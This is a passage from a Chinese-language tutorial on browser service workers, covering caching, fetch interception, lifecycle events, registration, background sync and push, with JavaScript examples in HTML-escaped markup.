class=\"hljs-keyword\"\u003evar\u003c/span\u003e urlsToCache = [\n  \u003cspan class=\"hljs-string\"\u003e'/styles/main.css'\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e'/script/main.js'\u003c/span\u003e\n];\n\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'install'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecache\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache.addAll(urlsToCache);\n      })\n  );\n});\n\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e url = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e URL(event.request.url);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (url.pathname == \u003cspan class=\"hljs-string\"\u003e'/deer.png'\u003c/span\u003e) {\n    event.respondWith(\n      fetch(\u003cspan class=\"hljs-string\"\u003e'/horse.jpg'\u003c/span\u003e).catch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eex\u003c/span\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(ex))\n    );\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    event.respondWith(\n      caches.match(event.request)\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (response) {\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e response;\n          }\n          \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e fetch(event.request);\n        }\n      )\n    );\n  }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e结合这个简单的示例，来梳理一下其中反映出的信息：\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e(4.1) 基础组成元素\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003ePromise\u003c/h4\u003e\n\u003cp\u003e和其他两种 worker 不同的是，service worker 中的各项技术广泛地利用了 Promise\u003c/p\u003e\n\u003cp\u003ePromises 是一种非常适用于异步操作的机制，一个操作依赖于另一个操作的成功执行。这也成为了 service worker 的通用工作机制\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eResponse 对象\u003c/h4\u003e\n\u003cp\u003eResponse 的构造函数允许创建一个自定义的响应对象：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e Response(\u003cspan class=\"hljs-string\"\u003e'\u0026lt;p\u0026gt;Hello from service worker!\u0026lt;/p\u0026gt;'\u003c/span\u003e, {\n  \u003cspan class=\"hljs-attr\"\u003eheaders\u003c/span\u003e: { \u003cspan class=\"hljs-string\"\u003e'Content-Type'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'text/html'\u003c/span\u003e }\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但更常见的是：通过其他的 API 操作返回了一个 Response 对象，例如一个 service worker 的 \u003ccode\u003eevent.respondWith\u003c/code\u003e ，或者一个简单的 \u003ccode\u003efetch()\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e在 service worker 中使用 Response 对象时，通常还要通过 \u003ccode\u003eresponse.clone()\u003c/code\u003e 来取得一个克隆使用；这样做的原因是，一个 response 是一个流，只用被消费一次，而我们想让浏览器、缓存等多次操作这个响应，就需要 clone 出不同的对象来；对于 Request 请求对象的使用也是类似的道理\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eFetch\u003c/h4\u003e\n\u003cp\u003e在 service worker 中无法使用传统的 \u003ccode\u003eXMLHttpRequest\u003c/code\u003e，只能使用 \u003ccode\u003efetch\u003c/code\u003e；而后者的优势正在于，可以使用 \u003ccode\u003eRequest\u003c/code\u003e 和 \u003ccode\u003eResponse\u003c/code\u003e 对象\u003c/p\u003e\n\u003cp\u003e每次网络请求，都会触发对应的 service worker 中的 \u003ccode\u003efetch\u003c/code\u003e 事件\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049ab9f2a2c34f?w=579\u0026amp;h=494\u0026amp;f=png\u0026amp;s=22590\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e在我们的例子中，页面上有一个指向 \u003ccode\u003edeer.png\u003c/code\u003e 的图片元素，最后却由 \u003ccode\u003efetch\u003c/code\u003e 事件回调拦截并返回了 \u003ccode\u003e/horse.jpg\u003c/code\u003e，实现了指鹿为马的自定义资源指向\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(event) {\n  const url = new URL(event.request.url);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (url.pathname == \u003cspan class=\"hljs-string\"\u003e'/deer.png'\u003c/span\u003e) {\n    event.respondWith(\n      fetch(\u003cspan class=\"hljs-string\"\u003e'/horse.jpg'\u003c/span\u003e).catch(ex=\u0026gt;console.log(ex))\n    );\n  }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049ae8e5f8f244?w=848\u0026amp;h=1462\u0026amp;f=png\u0026amp;s=518760\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aed64cc72b7?w=1106\u0026amp;h=480\u0026amp;f=png\u0026amp;s=137068\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eCatch\u003c/h4\u003e\n\u003cp\u003e在 service worker 规范中包含了原生的缓存能力，用以替代已被废弃的 Application Cache 标准。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eCache\u003c/code\u003e API 提供了一个网络请求的持久层，并可以使用 match 操作查询这些请求。\u003c/p\u003e\n\u003cp\u003e在 service worker 中最主要用到 Cache 的地方，还是在上面提到的 \u003ccode\u003efetch\u003c/code\u003e 事件回调中。\u003c/p\u003e\n\u003cp\u003e通过使用本地缓存中的资源，不但能省去对网络的昂贵访问，更有了在 离线、掉线、网络不佳 等情况下维持应用可用的能力。\u003c/p\u003e\n\u003cp\u003e相关的定义如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface Cache {\n  match(request, optional cacheQueryOptions);\n  matchAll(optional request, optional cacheQueryOptions);\n  add(request);\n  addAll(requests);\n  put(request, response);\n  delete(request, optional cacheQueryOptions);\n  keys(optional request, optional cacheQueryOptions);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同时 service worker 也可以用 \u003ccode\u003eself.caches\u003c/code\u003e 来取得缓存：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface WindowOrWorkerGlobalScope {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute caches; //CacheStorage\n};\n\ninterface CacheStorage {\n  match(request, optional options); //Promise\n  has(cacheName); //Promise\n  open(cacheName); //Promise\n  delete(cacheName); //Promise\n  keys(); //Promise\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e反映在例子中就是(版本的部分会在稍后提到)：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'install'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecache\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache.addAll(urlsToCache);\n      })\n  );\n});\n\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n    event.respondWith(\n      caches.match(event.request)\n        .then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eresponse\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (response) {\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e response;\n          }\n          \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e fetch(event.request);\n        }\n      )\n    );\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e(4.2) 生命周期\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e完整的生命周期\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba7a4ea955?w=715\u0026amp;h=646\u0026amp;f=png\u0026amp;s=92272\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\n\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049abb7cfc78da?w=579\u0026amp;h=867\u0026amp;f=png\u0026amp;s=46136\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e将 server worker 的生命周期设计成这样，其目的在于：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e实现离线优先\u003c/li\u003e\n\u003cli\u003e允许新服务工作线程自行做好运行准备，无需中断当前的服务工作线程\u003c/li\u003e\n\u003cli\u003e确保整个过程中作用域页面由同一个服务工作线程（或者没有服务工作线程）控制\u003c/li\u003e\n\u003cli\u003e确保每次只运行网站的一个版本\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e对应的事件\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049ab9e6217140?w=573\u0026amp;h=167\u0026amp;f=png\u0026amp;s=6454\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e重要的比如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003einstall\u003c/code\u003e事件：使用\u003ccode\u003eregister()\u003c/code\u003e 注册时会触发\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eactivate\u003c/code\u003e事件：\u003ccode\u003eregister()\u003c/code\u003e 注册时也会触发activate事件\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e具体到各个事件的回调中，event 参数对应的类型如下：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e接口\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003einstall\u003c/td\u003e\n\u003ctd\u003eExtendableEvent\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eactivate\u003c/td\u003e\n\u003ctd\u003eExtendableEvent\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003efetch\u003c/td\u003e\n\u003ctd\u003eFetchEvent\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003emessage\u003c/td\u003e\n\u003ctd\u003eExtendableMessageEvent\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003emessageerror\u003c/td\u003e\n\u003ctd\u003eMessageEvent\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e其中有代表性的两个事件的定义如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface ExtendableEvent {\n  void \u003cspan class=\"hljs-built_in\"\u003ewait\u003c/span\u003eUntil(promiseFunc);\n};\n\ninterface FetchEvent {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute request;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute clientId;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute reservedClientId;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute targetClientId;\n\n  void respondWith(promiseFunc);\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以，才可以在例子中调用 \u003ccode\u003eevent.waitUntil()\u003c/code\u003e 和 \u003ccode\u003eevent.respondWith()\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'install'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  event.waitUntil( \u003cspan class=\"hljs-comment\"\u003e//用一个 promise 检查安装是否成功\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n  );\n});\n\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'fetch'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  event.respondWith( \u003cspan class=\"hljs-comment\"\u003e// 返回符合期望的 Response 对象\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n  );\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e注册\u003c/h4\u003e\n\u003cp\u003e不同于其他两种 worker 的是，service worker 不再用 new 来实例化，而是直接通过 \u003ccode\u003enavigator.serviceWorker\u003c/code\u003e 取得\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enavigator.serviceWorker\u003c/code\u003e 实际上实现了 \u003ccode\u003eServiceWorkerContainer\u003c/code\u003e 接口：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface ServiceWorkerContainer {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute controller;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute ready; //promise\n\n  register(scriptURL, optional registrationOptions);\n\n  getRegistration(optional clientURL = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e);\n  \n  getRegistrations();\n\n  void startMessages();\n\n  attribute oncontrollerchange;\n  attribute onmessage; // event.source is a worker\n  attribute onmessageerror;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e比如我们在例子中的主页面所做的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003enavigator.serviceWorker.register(\n\u0009\u003cspan class=\"hljs-string\"\u003e'myService.js'\u003c/span\u003e, \n\u0009{\u003cspan class=\"hljs-attr\"\u003escope\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e}\n).then().catch()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003escope 参数是选填的，可以被用来指定想让 service worker 控制的内容的子目录；service worker 能控制的最大权限层级就是其所在的目录\u003c/p\u003e\n\u003cp\u003e运行 \u003ccode\u003eregister()\u003c/code\u003e 方法成功的话，会在 \u003ccode\u003enavigator.serviceWorker\u003c/code\u003e 的 Promise 的 then 回调中得到一个 \u003ccode\u003eServiceWorkerRegistration\u003c/code\u003e 类型的对象；\u003c/p\u003e\n\u003cp\u003e正如例子中所示，主页面中就可以用这个实例化后的 'registration' 对象调用 \u003ccode\u003eonmessage\u003c/code\u003e 了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface ServiceWorkerRegistration {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute installing;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute waiting;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute active;\n  \n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute scope;\n  \n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute updateViaCache;\n\n  update(); //\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e promise\n  unregister(); //\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e promise\n\n  attribute onupdatefound;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e同时如果 \u003ccode\u003eregister()\u003c/code\u003e 成功，service worker 就在 \u003ccode\u003eServiceWorkerGlobalScope\u003c/code\u003e 环境中运行；\u003c/p\u003e\n\u003cp\u003e也就是说，\u003ccode\u003emyService.js\u003c/code\u003e 中引用的 \u003ccode\u003eself\u003c/code\u003e 就是这个类型了，可以调用 \u003ccode\u003eself.skipWaiting()\u003c/code\u003e 等方法；\u003c/p\u003e\n\u003cp\u003e这是一个特殊类型的 worker 上下文运行环境，与主运行线程相独立，同时也没有访问 DOM 等能力\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003einterface ServiceWorkerGlobalScope {\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute clients;\n  \u003cspan class=\"hljs-built_in\"\u003ereadonly\u003c/span\u003e attribute registration;\n\n  skipWaiting();\n\n  attribute oninstall;\n  attribute onactivate;\n  attribute onfetch;\n\n  attribute onmessage; // event.source is a client\n  attribute onmessageerror;\n};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e和 shared worker 类似，需要小心 service worker 脚本里的全局变量： 每个页面不会有自己独有的worker\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e安装\u003c/h4\u003e\n\u003cp\u003e在 service worker 注册之后，install 事件会被触发\u003c/p\u003e\n\u003cp\u003e在 install 回调中，一般执行以下任务：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e打开制定版本的缓存\u003c/li\u003e\n\u003cli\u003e缓存文件\u003c/li\u003e\n\u003cli\u003e确认所有需要的资源是否被缓存\u003c/li\u003e\n\u003cli\u003e如有指定的任何缓存文件无法下载，则安装步骤将失败\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e更新\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e更新 service worker 所在的 JavaScript 文件。用户打开页面时，浏览器会尝试在后台重新下载该 JS 文件；如果该文件与其当前所用文件存在字节差异，则将其视为“新版本的 service worker”。\u003c/li\u003e\n\u003cli\u003e新服务工作线程将会启动，且将会触发 install 事件\u003c/li\u003e\n\u003cli\u003e如果 service worker 已经被安装，但是刷新页面时有一个新版本的可用 -- 那么新版本虽会在后台安装，但还不会激活，且进入 waiting 状态\u003c/li\u003e\n\u003cli\u003e当不再有任何已加载的页面在使用旧版的 service worker 的时候，新版本才会激活，并触发其 activate 事件\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e出现在 activate 回调中的一个常见任务是缓存管理。在这个步骤进行缓存管理，而不是在之前的安装阶段进行，原因在于：如果在 install 步骤中清除了任何旧缓存，则继续控制所有当前页面的任何旧 service worker 将突然无法从缓存中提供文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'activate'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cacheWhitelist = [\u003cspan class=\"hljs-string\"\u003e'pages-cache-v1'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'blog-posts-cache-v1'\u003c/span\u003e];\n\n  event.waitUntil(\n    caches.keys().then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecacheNames\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e.all(\n        cacheNames.map(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecacheName\u003c/span\u003e) \u003c/span\u003e{\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (cacheWhitelist.indexOf(cacheName) === \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e) {\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e(4.3) 其他\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e需要 HTTPS\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e出于安全考虑，目前只能在 HTTPS 环境下才能使用 service worker；不符合则会抛出错误\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eDOMException: Only secure origins are allowed (see: https://goo.gl/Y0ZkNV).\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在测试时，是可以用 \u003ccode\u003ehttp://localhost\u003c/code\u003e 进行的\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 class=\"heading\"\u003e后台同步\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049abb20b392a4?w=1006\u0026amp;h=276\u0026amp;f=png\u0026amp;s=53456\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e后台同步(Background Sync)是基于 service worker 构建的另一个功能。允许用户一次性或按间隔时间请求后台数据同步。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e即使用户没有为您的网站打开标签，也会如此，仅唤醒 service worker\u003c/li\u003e\n\u003cli\u003e从页面请求执行此操作的权限，用户将收到提示\u003c/li\u003e\n\u003cli\u003e适用于非紧急更新，如社交时间表或新闻文章\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003enavigator.serviceWorker.register(\u003cspan class=\"hljs-string\"\u003e'sw.js'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-comment\"\u003e//...\u003c/span\u003e\n\nnavigator.serviceWorker.ready.then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eregistration\u003c/span\u003e=\u0026gt;\u003c/span\u003e{\n  registration.sync.register(\u003cspan class=\"hljs-string\"\u003e'update-leaderboard'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// registration succeeded\u003c/span\u003e\n  }, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// registration failed\u003c/span\u003e\n  });\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e//sw.js\u003c/span\u003e\nself.addEventListener(\u003cspan class=\"hljs-string\"\u003e'sync'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eevent\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (event.id == \u003cspan class=\"hljs-string\"\u003e'update-leaderboard'\u003c/span\u003e) {\n    event.waitUntil(\n      caches.open(\u003cspan class=\"hljs-string\"\u003e'mygame-dynamic'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003ecache\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e cache.add(\u003cspan class=\"hljs-string\"\u003e'/leaderboard.json'\u003c/span\u003e);\n      })\n    );\n  }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e推送\u003c/h4\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba24e342fc?w=1016\u0026amp;h=632\u0026amp;f=png\u0026amp;s=86080\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003ePush API 是基于 service worker 构建的另一个功能。该 API 允许唤醒 service worker 以响应来自操作系统消息传递服务的消息。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e即使用户没有为您的网站打开标签，也会如此，仅唤醒 service worker\u003c/li\u003e\n\u003cli\u003e从页面请求执行此操作的权限，用户将收到提示\u003c/li\u003e\n\u003cli\u003e适合于与通知相关的内容，如聊天消息、突发新闻或电子邮件\u003c/li\u003e\n\u003cli\u003e同时可用于频繁更改受益于立即同步的内容，如待办事项更新或日历更改\u003c/li\u003e\n\u003cli\u003e需要 google 的 FCM 通道服务，目前国内无法使用\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003echrome 离线小恐龙的游戏\u003c/h4\u003e\n\u003cp\u003e正是基于 service worker，chrome 在网络不可用时会显示小恐龙冒险的离线游戏，按下空格键，就可以开始了~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e(4.4) Service Worker 的浏览器兼容性\u003c/h3\u003e\n\u003cp\u003e由于一些相关的 google 服务无法用，iOS 上对其的支持也有限并在试验阶段，所以尚不具备大规模应用的条件；\u003c/p\u003e\n\u003cp\u003e但作为渐进式网络应用技术 PWA 中的最重要的组成部分，国内很多厂商已经在尝试推进相关的支持，未来值得期待：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049afce1b941f1?w=1330\u0026amp;h=938\u0026amp;f=png\u0026amp;s=138842\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eV. 总结\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eMaster-Worker\u003c/code\u003e 是常用的并行设计模式，用\u003ccode\u003eworker\u003c/code\u003e表示线程相关的概念就来源于此\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eweb worker\u003c/code\u003e 的出现使得在 Web 